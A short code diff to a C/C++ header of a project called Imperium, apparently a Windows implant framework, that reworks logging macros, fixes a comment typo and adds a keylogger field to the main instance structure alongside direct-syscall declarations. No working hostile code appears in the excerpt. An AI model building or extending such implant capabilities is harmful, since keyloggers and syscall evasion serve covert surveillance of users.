@@ -127,17 +127,16 @@ EXTERN_C PVOID StRipEnd();
 // have to adapt a few things for that
 //
 #define PRINTF( text, ... )             Imperium::io::printf( text, ##__VA_ARGS__ )
-
-#ifdef IMPERIUM_DEBUG
-#define PRINTF_INFO( text, ... )        PRINTF( "[INFO::%s::%s::%d] " text "\n", __TIME__, __FUNCTION__, __LINE__, ##__VA_ARGS__ )
-#define PRINTF_ERROR( text, ... )       PRINTF( "[ERROR::%s::%s::%d] " text "\n", __TIME__, __FUNCTION__, __LINE__, ##__VA_ARGS__ )
-#else
 #define PRINTF_INFO( text, ... )        PRINTF( "[*] " text "\n", ##__VA_ARGS__ )
 #define PRINTF_ERROR( text, ... )       PRINTF( "[!] " text "\n", ##__VA_ARGS__ )
-#endif
-
 #define PRINT_NT_ERROR( ntapi, status ) PRINTF_ERROR( "%s failed with error: 0x%08X\n", ntapi, status )
 #define PRINT_WIN32_ERROR( win32api )   PRINTF_ERROR( "%s failed with error: %ld\n", win32api, NtLastError() )
+
+#ifdef IMPERIUM_DEBUG
+#define PRINTF_DEBUG( text, ... )       PRINTF( "[DEBUG::%s::%s::%d] " text "\n", __TIME__, __FUNCTION__, __LINE__, ##__VA_ARGS__ )
+#else
+#define PRINTF_DEBUG( text, ... )
+#endif
 
 //
 // string
@@ -178,7 +177,7 @@ EXTERN_C NTSTATUS SyscallDirect(
 );
 
 //
-// enumm definition
+// enum definition
 //
 typedef enum _WIN32_RESOLVE_FLAGS : ULONG {
     SymbolSyscall      = 0x01,
@@ -238,7 +237,16 @@ typedef struct _INSTANCE {
     //
     BUFFER< PVOID > Base;
 
+    //
+    // output for console
+    // used by io::printf
+    //
     HANDLE ConsoleOutput;
+
+    //
+    // keylogger related data
+    //
+    KEYLOGGER Keylogger;
 } INSTANCE, *PINSTANCE;
 
 //
